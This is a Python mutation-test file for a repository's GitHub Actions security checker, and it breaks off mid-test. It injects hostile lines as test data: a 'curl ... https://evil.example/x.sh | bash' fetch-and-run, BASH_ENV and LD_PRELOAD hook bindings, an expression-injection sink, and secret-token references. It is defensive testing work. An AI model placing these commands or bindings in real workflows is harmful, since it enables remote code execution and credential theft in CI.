#!/usr/bin/env python3
"""Mutation tests for the workflow-security oracles.

Each test mutates a real workflow's text in a temporary repository and asserts
the corresponding check rejects it, so every guard is watched firing on the
exact thing it exists to prevent.
"""

from __future__ import annotations

from pathlib import Path
import tempfile
import unittest

from scripts.checks import workflow_security


class WorkflowInventoryAndCodeQLTests(unittest.TestCase):
    """Fail-closed policy for the workflow inventory and the CodeQL workflow."""

    def _workflow(self) -> str:
        """Return the live CodeQL workflow text."""
        return (
            workflow_security.REPO_ROOT / ".github" / "workflows" / "codeql.yml"
        ).read_text(encoding="utf-8")

    def _reject(self, mutated: str, pattern: str) -> None:
        """Require the CodeQL oracle to reject one mutated workflow."""
        self.assertNotEqual(mutated, self._workflow())
        with tempfile.TemporaryDirectory(prefix="mtest-codeql-security-") as raw_tmp:
            repo = Path(raw_tmp)
            workflow_path = repo / ".github" / "workflows" / "codeql.yml"
            workflow_path.parent.mkdir(parents=True)
            workflow_path.write_text(mutated, encoding="utf-8")
            with self.assertRaisesRegex(AssertionError, pattern):
                workflow_security.check_codeql_workflow(repo)

    def _write_inventory(self, root: Path) -> Path:
        """Create the exact expected workflow inventory in a temporary repo."""
        workflow_root = root / ".github" / "workflows"
        workflow_root.mkdir(parents=True)
        for relative in workflow_security.WORKFLOW_PATHS:
            source = workflow_security.REPO_ROOT / relative
            (workflow_root / relative.name).write_text(
                source.read_text(encoding="utf-8"),
                encoding="utf-8",
            )
        return workflow_root

    def test_repository_workflow_inventory_is_exact(self) -> None:
        self.assertEqual(
            workflow_security.WORKFLOW_PATHS,
            {
                Path(".github/workflows/ci.yml"),
                Path(".github/workflows/codeql.yml"),
                Path(".github/workflows/community-publish.yml"),
                Path(".github/workflows/community-verify.yml"),
                Path(".github/workflows/compat-canary.yml"),
                Path(".github/workflows/docs.yml"),
                Path(".github/workflows/release.yml"),
            },
        )
        workflow_security.check_workflow_inventory()

    def test_javascript_actions_pin_reviewed_node24_releases(self) -> None:
        self.assertEqual(
            workflow_security.CHECKOUT_ACTION_SHA,
            "3d3c42e5aac5ba805825da76410c181273ba90b1",
        )
        self.assertEqual(
            workflow_security.CODEQL_ACTION_SHA,
            "e4fba868fa4b1b91e1fdab776edc8cfbe6e9fb81",
        )
        for path in workflow_security.WORKFLOW_PATHS:
            name = path.name
            workflow = (workflow_security.REPO_ROOT / path).read_text(encoding="utf-8")
            self.assertNotIn("actions/checkout@v4", workflow, name)
            self.assertNotIn(
                "11bd71901bbe5b1630ceea73d27597364c9af683",
                workflow,
                name,
            )
        codeql = self._workflow()
        self.assertNotIn(
            "github/codeql-action/",
            codeql.replace(
                "github/codeql-action/init@e4fba868fa4b1b91e1fdab776edc8cfbe6e9fb81",
                "",
            ).replace(
                "github/codeql-action/analyze@e4fba868fa4b1b91e1fdab776edc8cfbe6e9fb81",
                "",
            ),
        )

    def test_every_external_action_has_an_immutable_pin_and_version_comment(
        self,
    ) -> None:
        workflow_security.check_action_pins()
        workflow = self._workflow()
        mutations = (
            workflow.replace(
                f"actions/checkout@{workflow_security.CHECKOUT_ACTION_SHA} # v7.0.1",
                "actions/checkout@v7",
                1,
            ),
            workflow.replace(
                f"github/codeql-action/init@{workflow_security.CODEQL_ACTION_SHA}"
                " # v4.37.3",
                f"github/codeql-action/init@{workflow_security.CODEQL_ACTION_SHA}",
                1,
            ),
        )
        for mutated in mutations:
            with tempfile.TemporaryDirectory(prefix="mtest-action-pins-") as raw_tmp:
                repo = Path(raw_tmp)
                workflow_root = repo / ".github" / "workflows"
                workflow_root.mkdir(parents=True)
                (workflow_root / "codeql.yml").write_text(
                    mutated,
                    encoding="utf-8",
                )
                with self.assertRaisesRegex(AssertionError, "action pin"):
                    workflow_security.check_action_pins(repo)

    def test_missing_workflow_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory(prefix="mtest-workflow-inventory-") as raw_tmp:
            repo = Path(raw_tmp)
            workflow_root = self._write_inventory(repo)
            (workflow_root / "codeql.yml").unlink()
            with self.assertRaisesRegex(AssertionError, "inventory mismatch"):
                workflow_security.check_workflow_inventory(repo)

    def test_extra_yaml_workflow_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory(prefix="mtest-workflow-inventory-") as raw_tmp:
            repo = Path(raw_tmp)
            workflow_root = self._write_inventory(repo)
            (workflow_root / "surprise.yaml").write_text(
                "name: Surprise\n",
                encoding="utf-8",
            )
            with self.assertRaisesRegex(AssertionError, "inventory mismatch"):
                workflow_security.check_workflow_inventory(repo)

    def test_symlinked_workflow_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory(prefix="mtest-workflow-inventory-") as raw_tmp:
            repo = Path(raw_tmp)
            workflow_root = self._write_inventory(repo)
            (workflow_root / "codeql.yml").unlink()
            (workflow_root / "codeql.yml").symlink_to("ci.yml")
            with self.assertRaisesRegex(AssertionError, "symlink"):
                workflow_security.check_workflow_inventory(repo)

    def test_all_required_triggers_are_pinned(self) -> None:
        workflow = self._workflow()
        mutations = {
            "push": workflow.replace(
                "  push:\n    branches: [main]\n",
                "",
                1,
            ),
            "pull_request": workflow.replace(
                "  pull_request:\n    branches: [main]\n",
                "",
                1,
            ),
            "schedule": workflow.replace(
                '  schedule:\n    - cron: "23 4 * * 1"\n',
                "",
                1,
            ),
            "workflow_dispatch": workflow.replace("  workflow_dispatch:\n", "", 1),
        }
        for trigger, mutated in mutations.items():
            with self.subTest(trigger=trigger):
                self._reject(mutated, "trigger mismatch")

    def test_security_event_write_permission_is_required(self) -> None:
        self._reject(
            self._workflow().replace(
                "  security-events: write",
                "  security-events: read",
                1,
            ),
            "permission mismatch",
        )

    def test_codeql_autobuild_is_rejected(self) -> None:
        workflow = self._workflow()
        marker = "      - name: Analyze C and C++\n"
        mutated = workflow.replace(
            marker,
            "      - name: Autobuild\n"
            "        uses: github/codeql-action/autobuild@"
            f"{workflow_security.CODEQL_ACTION_SHA}"
            " # v4.37.3\n\n" + marker,
            1,
        )
        self._reject(mutated, "autobuild")

    def test_native_job_requires_the_real_manual_build(self) -> None:
        self._reject(
            self._workflow().replace(
                "        run: pixi run build-native",
                "        run: true",
                1,
            ),
            "manual build",
        )

    def test_python_job_must_not_build_the_product(self) -> None:
        workflow = self._workflow()
        marker = "      - name: Analyze Python\n"
        mutated = workflow.replace(
            marker,
            "      - name: Build product\n        run: pixi run build\n\n" + marker,
            1,
        )
        self._reject(mutated, "Python job must not run shell commands")

    def test_action_tag_in_place_of_commit_is_rejected(self) -> None:
        self._reject(
            self._workflow().replace(
                f"github/codeql-action/init@{workflow_security.CODEQL_ACTION_SHA}",
                "github/codeql-action/init@v3",
                1,
            ),
            "action pin mismatch",
        )


class DocsWorkflowTests(unittest.TestCase):
    """Fail-closed privilege, trigger, and build-entry policy for the site.

    The documentation workflow is the only one in the repository that is handed
    `pages: write` and `id-token: write`, so every mutation below is a way that
    authority, or the pull-request lane that exercises the build before it, could
    be lost in a diff nobody reads closely.
    """

    def _workflow(self) -> str:
        """Return the live documentation workflow text."""
        return (
            workflow_security.REPO_ROOT / ".github" / "workflows" / "docs.yml"
        ).read_text(encoding="utf-8")

    def _reject(self, mutated: str, pattern: str) -> None:
        """Require the documentation oracle to reject one mutated workflow."""
        self.assertNotEqual(mutated, self._workflow())
        with tempfile.TemporaryDirectory(prefix="mtest-docs-security-") as raw_tmp:
            repo = Path(raw_tmp)
            workflow_path = repo / ".github" / "workflows" / "docs.yml"
            workflow_path.parent.mkdir(parents=True)
            workflow_path.write_text(mutated, encoding="utf-8")
            with self.assertRaisesRegex(AssertionError, pattern):
                workflow_security.check_docs_workflow(repo)

    def test_live_docs_workflow_is_least_privilege(self) -> None:
        workflow_security.check_docs_workflow()

    def test_pages_actions_pin_reviewed_revisions(self) -> None:
        self.assertEqual(
            workflow_security.UPLOAD_PAGES_ARTIFACT_ACTION_SHA,
            "fc324d3547104276b827a68afc52ff2a11cc49c9",
        )
        self.assertEqual(
            workflow_security.DEPLOY_PAGES_ACTION_SHA,
            "cd2ce8fcbc39b97be8ca5fce6e763baed58fa128",
        )
        self.assertEqual(
            workflow_security.REVIEWED_ACTION_PINS["actions/upload-pages-artifact"],
            {(workflow_security.UPLOAD_PAGES_ARTIFACT_ACTION_SHA, "v5.0.0")},
        )
        self.assertEqual(
            workflow_security.REVIEWED_ACTION_PINS["actions/deploy-pages"],
            {(workflow_security.DEPLOY_PAGES_ACTION_SHA, "v5.0.0")},
        )
        workflow = self._workflow()
        self.assertIn(
            "actions/upload-pages-artifact@"
            f"{workflow_security.UPLOAD_PAGES_ARTIFACT_ACTION_SHA} # v5.0.0",
            workflow,
        )
        self.assertIn(
            f"actions/deploy-pages@{workflow_security.DEPLOY_PAGES_ACTION_SHA}"
            " # v5.0.0",
            workflow,
        )

    def test_pages_action_moved_off_its_reviewed_revision_is_rejected(self) -> None:
        mutated = self._workflow().replace(
            workflow_security.DEPLOY_PAGES_ACTION_SHA,
            "0" * 40,
            1,
        )
        with tempfile.TemporaryDirectory(prefix="mtest-docs-pin-") as raw_tmp:
            repo = Path(raw_tmp)
            workflow_root = repo / ".github" / "workflows"
            workflow_root.mkdir(parents=True)
            (workflow_root / "docs.yml").write_text(mutated, encoding="utf-8")
            with self.assertRaisesRegex(AssertionError, "reviewed action pin"):
                workflow_security.check_action_pins(repo)

    def test_docs_workflow_is_in_the_governed_inventory(self) -> None:
        self.assertIn(
            Path(".github/workflows/docs.yml"),
            workflow_security.WORKFLOW_PATHS,
        )

    def test_build_must_run_on_pull_requests(self) -> None:
        self._reject(
            self._workflow().replace("  pull_request:\n", "", 1),
            "trigger mismatch",
        )

    def test_pull_request_trigger_cannot_be_narrowed_to_a_branch(self) -> None:
        self._reject(
            self._workflow().replace(
                "  pull_request:\n",
                "  pull_request:\n    branches: [main]\n",
                1,
            ),
            "pull_request must not be narrowed",
        )

    def test_deploy_must_stay_conditioned_on_a_main_push(self) -> None:
        workflow = self._workflow()
        marker = (
            "    if: github.event_name == 'push' && github.ref == 'refs/heads/main'\n"
        )
        self.assertIn(marker, workflow)
        for label, mutated in {
            "removed": workflow.replace(marker, "", 1),
            "widened": workflow.replace(
                marker,
                "    if: github.event_name == 'push'\n",
                1,
            ),
        }.items():
            with self.subTest(condition=label):
                self._reject(mutated, "deploy condition mismatch")

    def test_top_level_permissions_cannot_widen(self) -> None:
        self._reject(
            self._workflow().replace(
                "permissions:\n  contents: read\n",
                "permissions:\n  contents: write\n",
                1,
            ),
            "workflow permission mismatch",
        )

    def test_publication_permissions_cannot_escape_the_deploy_job(self) -> None:
        workflow = self._workflow()
        self._reject(
            workflow.replace(
                "permissions:\n  contents: read\n",
                "permissions:\n  contents: read\n  pages: write\n",
                1,
            ),
            "workflow permission mismatch",
        )
        self._reject(
            workflow.replace(
                "    timeout-minutes: 15\n",
                "    timeout-minutes: 15\n"
                "    permissions:\n"
                "      contents: read\n"
                "      id-token: write\n",
                1,
            ),
            "permission override membership",
        )

    def test_continue_on_error_is_rejected(self) -> None:
        self._reject(
            self._workflow().replace(
                "        run: pixi run docs-build\n",
                "        run: pixi run docs-build\n        continue-on-error: true\n",
                1,
            ),
            "continue-on-error",
        )

    def test_build_must_go_through_the_documentation_task(self) -> None:
        self._reject(
            self._workflow().replace(
                "        run: pixi run docs-build",
                "        run: uvx mkdocs build",
                1,
            ),
            "build entry mismatch",
        )

    def test_uploaded_directory_must_be_the_configured_site_output(self) -> None:
        self._reject(
            self._workflow().replace(
                "          path: build/site",
                "          path: .",
                1,
            ),
            "artifact path mismatch",
        )

    def test_deploy_cannot_run_without_the_build(self) -> None:
        self._reject(
            self._workflow().replace("    needs: build\n", "", 1),
            "must wait for the build job",
        )

    def test_a_deploy_job_that_publishes_nothing_is_rejected(self) -> None:
        """A `deploy` job with no deploy step is green and publishes nothing."""
        self._reject(
            self._workflow().replace(
                "        uses: actions/deploy-pages@"
                f"{workflow_security.DEPLOY_PAGES_ACTION_SHA} # v5.0.0\n",
                "",
                1,
            ),
            "deploy step mismatch",
        )

    def test_another_reviewed_action_cannot_stand_in_for_the_deploy(self) -> None:
        """Every other assertion here passes while the site stops updating."""
        self._reject(
            self._workflow().replace(
                "        uses: actions/deploy-pages@"
                f"{workflow_security.DEPLOY_PAGES_ACTION_SHA} # v5.0.0",
                "        uses: actions/upload-artifact@"
                f"{workflow_security.UPLOAD_ARTIFACT_ACTION_SHA} # v7.0.1",
                1,
            ),
            "deploy step mismatch",
        )

    def test_a_conditioned_deploy_step_is_rejected(self) -> None:
        """A skipped step leaves the job successful and the site unchanged."""
        self._reject(
            self._workflow().replace(
                "        id: deployment\n",
                "        id: deployment\n        if: false\n",
                1,
            ),
            "step-level condition",
        )


class PublishedActionTests(unittest.TestCase):
    """Fail-closed policy for the composite action this repository publishes.

    Every other check in this module governs an action the repository
    *consumes*. This one governs the one it *publishes*, which is the surface a
    consumer trusts by writing a single `uses:` line, and which no review of a
    workflow diff would ever look at.
    """

    def _action(self) -> str:
        """Return the live published action definition."""
        return (
            workflow_security.REPO_ROOT / workflow_security.PUBLISHED_ACTION_PATH
        ).read_text(encoding="utf-8")

    def _reject(self, mutated: str, pattern: str) -> None:
        """Require the published-action oracle to reject one mutated definition."""
        self.assertNotEqual(mutated, self._action())
        with tempfile.TemporaryDirectory(prefix="mtest-published-action-") as raw_tmp:
            repo = Path(raw_tmp)
            (repo / workflow_security.PUBLISHED_ACTION_PATH).write_text(
                mutated,
                encoding="utf-8",
            )
            with self.assertRaisesRegex(AssertionError, pattern):
                workflow_security.check_published_action(repo)

    def test_live_published_action_is_reviewable(self) -> None:
        workflow_security.check_published_action()

    def test_published_action_is_a_thin_pass_through(self) -> None:
        action = self._action()
        self.assertIn("  paths:\n", action)
        self.assertIn("  args:\n", action)
        self.assertIn(
            "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS\n",
            action,
        )
        for absent in ("uses:", "prefix-dev/setup-pixi", "cache", "--junit-xml"):
            self.assertNotIn(absent, action)

    def test_inputs_reach_the_shell_as_environment_variables(self) -> None:
        """The injection sink, pinned as bytes rather than as an intention.

        `run: pixi run mtest ${{ inputs.args }}` is substituted into the script
        text before bash parses it, so a consumer wiring a pull-request title
        into `args` executes that title in their own job under their own token.
        The reviewed form names the inputs in `env:` and expands them as shell
        variables, which keeps the documented word-splitting and leaves the
        substitution nothing to inject into.
        """
        action = self._action()
        self.assertEqual(
            workflow_security.PUBLISHED_ACTION_RUNS,
            ("pixi run mtest $MTEST_PATHS $MTEST_ARGS",),
        )
        for line in workflow_security.PUBLISHED_ACTION_EXPRESSION_LINES:
            self.assertIn(f"{line}\n", action)
        self.assertNotIn("run: pixi run mtest ${{", action)

    def test_an_unreviewed_command_is_rejected(self) -> None:
        """The gap this closes: the oracle never read what the action runs."""
        self._reject(
            self._action().replace(
                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS",
                "      run: curl -fsSL https://evil.example/x.sh | bash",
                1,
            ),
            "reviewed invocation",
        )

    def test_an_expression_on_the_run_line_is_rejected(self) -> None:
        """Restoring the injection sink must fail, not merely look different."""
        self._reject(
            self._action().replace(
                "      env:\n"
                "        MTEST_PATHS: ${{ inputs.paths }}\n"
                "        MTEST_ARGS: ${{ inputs.args }}\n"
                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS",
                "      run: pixi run mtest ${{ inputs.paths }} ${{ inputs.args }}",
                1,
            ),
            "reviewed invocation",
        )

    def test_a_dropped_environment_binding_is_rejected(self) -> None:
        """Without the binding the command silently runs against no paths."""
        self._reject(
            self._action().replace(
                "        MTEST_PATHS: ${{ inputs.paths }}\n",
                "",
                1,
            ),
            "reviewed environment lines",
        )

    def test_an_unreviewed_environment_key_is_rejected(self) -> None:
        """A key can run code without substituting anything into the script.

        `shell: bash` runs as `bash --noprofile --norc -eo pipefail`, and
        `--norc` does not suppress `BASH_ENV`: a non-interactive bash sources
        whatever it names before reading the script. Each binding below is
        static, so the expression rule sees nothing to object to, the reviewed
        command is untouched, and the step still fails the consumer's job on a
        failing run — every existing rule passes while the consumer executes
        the attacker's file first.
        """
        for label, binding in {
            "BASH_ENV": "        BASH_ENV: ./hook.sh\n",
            "LD_PRELOAD": "        LD_PRELOAD: ./evil.so\n",
        }.items():
            with self.subTest(key=label):
                self._reject(
                    self._action().replace("      env:\n", f"      env:\n{binding}", 1),
                    "only the reviewed environment keys",
                )

    def test_an_environment_block_at_another_depth_is_rejected(self) -> None:
        """The rule reads every `env:` under `runs:`, not only the reviewed one.

        Anchoring on the step's own indentation would leave a binding written
        at any other depth unread, and unread is indistinguishable from absent.
        """
        self._reject(
            self._action().replace(
                "  steps:\n",
                "  steps:\n    env:\n      BASH_ENV: ./hook.sh\n",
                1,
            ),
            "only the reviewed environment keys",
        )

    def test_the_reviewed_environment_keys_are_the_two_inputs(self) -> None:
        """The rule is an exact set, so it cannot be satisfied vacuously."""
        self.assertEqual(
            workflow_security.PUBLISHED_ACTION_ENV_KEYS,
            ("MTEST_PATHS", "MTEST_ARGS"),
        )
        for key in workflow_security.PUBLISHED_ACTION_ENV_KEYS:
            self.assertIn(f"        {key}: ", self._action())

    def test_a_step_in_another_shell_is_rejected(self) -> None:
        self._reject(
            self._action().replace("    - shell: bash\n", "    - shell: pwsh\n", 1),
            "shell bash",
        )

    def test_a_second_run_step_is_rejected(self) -> None:
        """One entry in the reviewed list pins the step count as well."""
        self._reject(
            self._action().replace(
                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS\n",
                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS\n"
                "    - shell: bash\n"
                "      run: echo done\n",
                1,
            ),
            "reviewed invocation",
        )

    def test_a_conditioned_step_is_rejected(self) -> None:
        """A skipped test run reports green in the consumer's workflow."""
        self._reject(
            self._action().replace(
                "    - shell: bash\n",
                "    - if: ${{ success() }}\n      shell: bash\n",
                1,
            ),
            "must not condition a step",
        )

    def test_a_discarded_exit_code_is_rejected(self) -> None:
        self._reject(
            self._action().replace(
                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS",
                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS || true",
                1,
            ),
            r"\|\| true",
        )

    def test_bracket_form_credential_references_are_rejected(self) -> None:
        """`secrets['X']` and `github['token']` name what the dotted form does."""
        for label, expression in {
            "secret": "${{ secrets['PUBLISH_TOKEN'] }}",
            "token": "${{ github['token'] }}",
        }.items():
            with self.subTest(reference=label):
                self._reject(
                    self._action().replace(
                        "      env:\n",
                        f"      env:\n        TOKEN: {expression}\n",
                        1,
                    ),
                    "credential reference",
                )

    def test_missing_published_action_is_rejected(self) -> None:
        with (
            tempfile.TemporaryDirectory(prefix="mtest-published-action-") as raw_tmp,
            self.assertRaises(OSError),
        ):
            workflow_security.check_published_action(Path(raw_tmp))

    def test_non_composite_action_is_rejected(self) -> None:
        self._reject(
            self._action().replace("  using: composite\n", "  using: node24\n", 1),
            "must be a composite action",
        )

    def test_secret_reference_is_rejected(self) -> None:
        self._reject(
            self._action().replace(
                "      run: pixi run mtest",
                "      env:\n"
                "        TOKEN: ${{ secrets.PUBLISH_TOKEN }}\n"
                "      run: pixi run mtest",
                1,
            ),
            "credential reference",
        )

    def test_caller_token_reference_is_rejected(self) -> None:
        self._reject(
            self._action().replace(
                "      run: pixi run mtest",
                "      env:\n"
                "        TOKEN: ${{ github.token }}\n"
                "      run: pixi run mtest",
                1,
            ),
            "credential reference",
        )

    def test_continue_on_error_is_rejected(self) -> None:
        self._reject(
            self._action().replace(
                "    - shell: bash\n",
                "    - shell: bash\n      continue-on-error: true\n",
                1,
            ),
            "continue-on-error",
        )

    def test_action_referenced_by_tag_is_rejected(self) -> None:
        self._reject(
            self._action().replace(
                "    - shell: bash\n",
                "    - uses: actions/checkout@v7\n    - shell: bash\n",
                1,
            ),
            "action pin must use a full commit SHA",
        )

    def test_action_referenced_without_a_version_comment_is_rejected(self) -> None:
        self._reject(
            self._action().replace(
                "    - shell: bash\n",
                "    - uses: actions/checkout@"
                f"{workflow_security.CHECKOUT_ACTION_SHA}\n"
                "    - shell: bash\n",
                1,
            ),
            "action pin must use a full commit SHA",
        )

    def test_local_action_reference_is_rejected(self) -> None:
        self._reject(
            self._action().replace(
                "    - shell: bash\n",
                "    - uses: ./.github/actions/setup\n    - shell: bash\n",
                1,
            ),
            "action pin must use a full commit SHA",
        )

    def test_unreviewed_full_sha_is_rejected(self) -> None:
        self._reject(
            self._action().replace(
                "    - shell: bash\n",
                f"    - uses: actions/checkout@{'0' * 40} # v7.0.1\n"
                "    - shell: bash\n",
                1,
            ),
            "reviewed action pin mismatch",
        )

    def test_reviewed_pin_is_accepted_so_the_rule_is_not_vacuous(self) -> None:
        mutated = self._action().replace(
            "    - shell: bash\n",
            f"    - uses: actions/checkout@{workflow_security.CHECKOUT_ACTION_SHA}"
            " # v7.0.1\n    - shell: bash\n",
            1,
        )
        with tempfile.TemporaryDirectory(prefix="mtest-published-action-") as raw_tmp:
            repo = Path(raw_tmp)
            (repo / workflow_security.PUBLISHED_ACTION_PATH).write_text(
                mutated,
                encoding="utf-8",
            )
            workflow_security.check_published_action(repo)


class ReleaseWorkflowTests(unittest.TestCase):
    """Fail-closed publication workflow authority and evidence boundaries."""

    def _workflow(self, name: str) -> str:
        return (workflow_security.REPO_ROOT / ".github" / "workflows" / name).read_text(
            encoding="utf-8"
        )

    def _reject(self, name: str, mutated: str, pattern: str) -> None:
        with tempfile.TemporaryDirectory(prefix="mtest-release-security-") as raw_tmp:
            repo = Path(raw_tmp)
            workflow_root = repo / ".github" / "workflows"
            workflow_root.mkdir(parents=True)
            for workflow_name in (
                "release.yml",
                "community-publish.yml",
                "community-verify.yml",
            ):
                text = (
                    mutated if workflow_name == name else self._workflow(workflow_name)
                )
                (workflow_root / workflow_name).write_text(text, encoding="utf-8")
            with self.assertRaisesRegex(AssertionError, pattern):
                workflow_security.check_release_workflows(repo)

    def test_live_publication_workflows_have_closed_authority(self) -> None:
        workflow_security.check_release_workflows()

    def test_setup_pixi_without_install_rejects_install_only_inputs(self) -> None:
        invalid_inputs = ("cache: true", "locked: true")
        good_block = "          cache: false\n          run-install: false"
        for workflow_name in (
            "release.yml",
            "community-publish.yml",
            "community-verify.yml",
        ):
            baseline = self._workflow(workflow_name)
            self.assertIn(good_block, baseline)
            for invalid_input in invalid_inputs:
                with self.subTest(
                    workflow=workflow_name,
                    invalid_input=invalid_input,
                ):
                    mutated = baseline.replace(
                        good_block,
                        f"          {invalid_input}\n          run-install: false",
                        1,
                    )
                    self._reject(
                        workflow_name,
                        mutated,
                        "setup-pixi.*run-install",
                    )

    def test_protected_environments_cannot_be_removed(self) -> None:
        self._reject(
            "release.yml",
            self._workflow("release.yml").replace(
                "    environment: github-release\n",
                "",
                1,
            ),
            "github-release",
        )
        self._reject(
            "community-publish.yml",
            self._workflow("community-publish.yml").replace(
                "    environment: community-publish\n",
                "",
                1,
            ),
            "community-publish",
        )

    def test_fork_token_cannot_escape_prepare_job(self) -> None:
        workflow = self._workflow("community-publish.yml")
        marker = "    runs-on: ubuntu-24.04\n"
        self._reject(
            "community-publish.yml",
            workflow.replace(
                marker,
                marker + "    env: ${{ secrets.COMMUNITY_FORK_TOKEN }}\n",
                1,
            ),
            "fork token",
        )

    def test_release_requires_exact_ci_candidate_and_immutable_state(self) -> None:
        for needle in (".immutable == true",):
            with self.subTest(needle=needle):
                self._reject(
                    "release.yml",
                    self._workflow("release.yml").replace(needle, "false", 1),
                    "release evidence",
                )

    def test_publication_evidence_is_bound_to_canonical_workflow_files(self) -> None:
        release = self._workflow("release.yml")
        community = self._workflow("community-publish.yml")
        ci_endpoint = "actions/workflows/ci.yml/runs?"
        self.assertEqual(release.count(ci_endpoint), 2)
        self.assertEqual(community.count(ci_endpoint), 1)
        self.assertNotIn('.name == "CI"', release + community)
        self.assertEqual(release.count(".workflow_id == $workflow_id"), 2)
        # The run object's `path` is the bare workflow file path; the `@ref`
        # form belongs to `github.workflow_ref`, not here. An `@`-prefixed
        # match can never be true, which silently disabled both bindings.
        self.assertEqual(
            release.count('.path == ".github/workflows/community-publish.yml"'),
            2,
        )
        self.assertIn(
            'test "$WORKFLOW_RUN_PATH" = ".github/workflows/release.yml"',
            community,
        )
        self.assertIn(
            'test "$WORKFLOW_RUN_WORKFLOW_ID" = "$release_workflow_id"',
            community,
        )
        self.assertIn(
            'test "$WORKFLOW_DEFINITION_SHA" = "$WORKFLOW_RUN_SHA"',
            community,
        )
        self.assertIn("scripts.release.recipe stage-target", community)
        self.assertIn(
            "api.github.com/repos/$FORK_OWNER/modular-community",
            community,
        )
        self.assertIn("scripts.release.community fork", community)

    def test_manual_prepare_ci_gate_cannot_apply_to_dry_run(self) -> None:
        workflow = self._workflow("community-publish.yml")
        self._reject(
            "community-publish.yml",
            workflow.replace(
                '            if test "$mode" = "prepare"; then\n',
                "            if true; then\n",
                1,
            ),
            "manual prepare CI",
        )

    def test_candidate_workflow_identity_tautology_is_rejected(self) -> None:
        self._reject(
            "release.yml",
            self._workflow("release.yml").replace(
                ".workflow_id == $workflow_id",
                ".workflow_id == .workflow_id",
                1,
            ),
            "candidate workflow identity",
        )

    def test_triggering_workflow_definition_mismatch_is_rejected(self) -> None:
        self._reject(
            "community-publish.yml",
            self._workflow("community-publish.yml").replace(
                'test "$WORKFLOW_RUN_WORKFLOW_ID" = "$release_workflow_id"',
                'test "$WORKFLOW_RUN_WORKFLOW_ID" = "$WORKFLOW_RUN_WORKFLOW_ID"',
                1,
            ),
            "triggering release workflow",
        )

    def test_exact_fork_recipe_staging_cannot_regress_to_overlay_copy(self) -> None:
        self._reject(
            "community-publish.yml",
            self._workflow("community-publish.yml").replace(
                "scripts.release.recipe stage-target",
                "scripts.release.recipe stage",
                1,
            ),
            "stage-target",
        )

    def test_publication_workflows_cannot_gain_oidc_authority(self) -> None:
        self._reject(
            "release.yml",
            self._workflow("release.yml").replace(
                "  actions: read\n",
                "  actions: read\n  id-token: write\n",
                1,
            ),
            "permission",
        )
        self._reject(
            "community-publish.yml",
            self._workflow("community-publish.yml").replace(
                "    environment: community-publish\n",
                "    environment: community-publish\n"
                "    permissions:\n"
                "      id-token: write\n",
                1,
            ),
            "permission",
        )

    def test_reviewed_action_cannot_move_to_an_arbitrary_full_sha(self) -> None:
        workflow = self._workflow("release.yml").replace(
            workflow_security.CHECKOUT_ACTION_SHA,
            "0" * 40,
            1,
        )
        with tempfile.TemporaryDirectory(prefix="mtest-action-pin-") as raw_tmp:
            repo = Path(raw_tmp)
            workflow_root = repo / ".github" / "workflows"
            workflow_root.mkdir(parents=True)
            (workflow_root / "release.yml").write_text(workflow, encoding="utf-8")
            with self.assertRaisesRegex(AssertionError, "reviewed action pin"):
                workflow_security.check_action_pins(repo)

    def test_created_false_workflow_run_must_be_a_noop(self) -> None:
        self._reject(
            "community-publish.yml",
            self._workflow("community-publish.yml").replace(
                '            if test "$(jq -r .created "$evidence")" = "false"; then\n'
                "              active=false\n"
                "            fi\n",
                "",
                1,
            ),
            "created false",
        )

    def test_public_verification_cannot_gain_mutation_authority(self) -> None:
        workflow = self._workflow("community-verify.yml")
        self._reject(
            "community-verify.yml",
            workflow.replace("  contents: read\n", "  contents: write\n", 1),
            "permission",
        )

    def test_community_macos_runner_cannot_float(self) -> None:
        for workflow_name in ("community-publish.yml", "community-verify.yml"):
            workflow = self._workflow(workflow_name)
            self._reject(
                workflow_name,
                workflow.replace("runner: macos-26", "runner: macos-latest", 1),
                "macos-26|platform matrix",
            )


class CompatCanaryWorkflowTests(unittest.TestCase):
    """Fail-closed policy for the scheduled compatibility canary.

    This is the only workflow in the repository that downloads a compiler from a
    package channel and executes it against the source tree, and the only reason
    that is acceptable is what the job doing it is denied: any write scope, any
    credential in its environment, any credential on disk, and any route to the
    job that holds one. Every mutation below is a way that separation could be
    lost in a diff that reads like a tidy-up — a permission line, a step moved
    between jobs, an install that happens one step too early.
    """

    def _workflow(self) -> str:
        """Return the live compatibility-canary workflow text."""
        return (
            workflow_security.REPO_ROOT / ".github" / "workflows" / "compat-canary.yml"
        ).read_text(encoding="utf-8")

    def _reject(self, mutated: str, pattern: str) -> None:
        """Require the canary oracle to reject one mutated workflow."""
        self.assertNotEqual(mutated, self._workflow())
        with tempfile.TemporaryDirectory(prefix="mtest-canary-security-") as raw_tmp:
            repo = Path(raw_tmp)
            workflow_path = repo / ".github" / "workflows" / "compat-canary.yml"
            workflow_path.parent.mkdir(parents=True)
            workflow_path.write_text(mutated, encoding="utf-8")
            with self.assertRaisesRegex(AssertionError, pattern):
                workflow_security.check_compat_canary_workflow(repo)

    def test_live_canary_workflow_keeps_its_credential_split(self) -> None:
        workflow_security.check_compat_canary_workflow()

    def test_canary_workflow_is_in_the_governed_inventory(self) -> None:
        self.assertIn(
            Path(".github/workflows/compat-canary.yml"),
            workflow_security.WORKFLOW_PATHS,
        )

    def test_the_oracle_runs_in_the_repository_policy_gate(self) -> None:
        """An oracle nothing calls is an oracle that never rejects anything."""
        source = (
            workflow_security.REPO_ROOT / "scripts" / "checks" / "workflow_security.py"
        ).read_text(encoding="utf-8")
        main_body = source.split("def main() -> int:", 1)[1]
        self.assertIn("check_compat_canary_workflow()", main_body)

    def test_workflow_name_is_pinned(self) -> None:
        self._reject(
            self._workflow().replace("name: Compat Canary\n", "name: Canary\n", 1),
            "name mismatch",
        )

    def test_continue_on_error_is_rejected(self) -> None:
        self._reject(
            self._workflow().replace(
                '        run: python3 -m scripts.canary.run --lane "$CANARY_LANE"\n',
                '        run: python3 -m scripts.canary.run --lane "$CANARY_LANE"\n'
                "        continue-on-error: true\n",
                1,
            ),
            "continue-on-error",
        )

    def test_the_weekday_schedule_cannot_drift(self) -> None:
        workflow = self._workflow()
        for label, mutated in {
